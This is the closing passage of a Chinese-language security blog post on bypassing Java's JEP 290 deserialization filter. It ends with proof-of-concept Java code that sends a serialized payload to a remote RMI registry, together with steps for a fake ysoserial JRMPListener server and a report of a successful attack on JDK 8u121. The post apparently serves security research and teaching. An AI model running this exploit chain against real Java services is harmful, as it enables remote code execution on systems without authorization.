operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(getPayload());</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RegistryImpl_Stub</span> <span class="variable">registry</span> <span class="operator">=</span> (RegistryImpl_Stub) LocateRegistry.getRegistry(<span class="string">&quot;xxx.xxx.xxx.xxx&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        lookup(registry);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后直接用 Ysoserial 中 ysoserial.exploit.JRMPListener 这个 Payload 去伪造一个服务端，之后运行 JRMPClientPayload 如下–&gt;</p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764557309.png" alt="Bypass JEP 290-13"></p>
<p>此时也成功触发 DNS 请求，如下–&gt;</p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405978.png" alt="Bypass JEP 290-14"></p>
<p>在 JDK 版本为 JDK 8u121 的情况下，成功的完成了一次对 Server 端的攻击，Success Bypass JEP 290！</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-JEP-290%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">What is JEP 290？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JEP-290-%E7%9A%84%E5%81%9A%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">JEP 290 的做法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E4%BA%8E-Server-%E7%AB%AF%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">针对于 Server 端的攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E4%BA%8E-Client-%E7%AB%AF%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">针对于 Client 端的攻击</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/11/26/Bypass-JEP-290/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/11/26/Bypass-JEP-290/&text=Bypass JEP 290"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/11/26/Bypass-JEP-290/&title=Bypass JEP 290"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/11/26/Bypass-JEP-290/&is_video=false&description=Bypass JEP 290"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Bypass JEP 290&body=Check out this article: http://example.com/2025/11/26/Bypass-JEP-290/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/11/26/Bypass-JEP-290/&title=Bypass JEP 290"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/11/26/Bypass-JEP-290/&title=Bypass JEP 290"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/11/26/Bypass-JEP-290/&title=Bypass JEP 290"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/11/26/Bypass-JEP-290/&title=Bypass JEP 290"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/11/26/Bypass-JEP-290/&name=Bypass JEP 290&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/11/26/Bypass-JEP-290/&t=Bypass JEP 290"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    Oyst3r
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
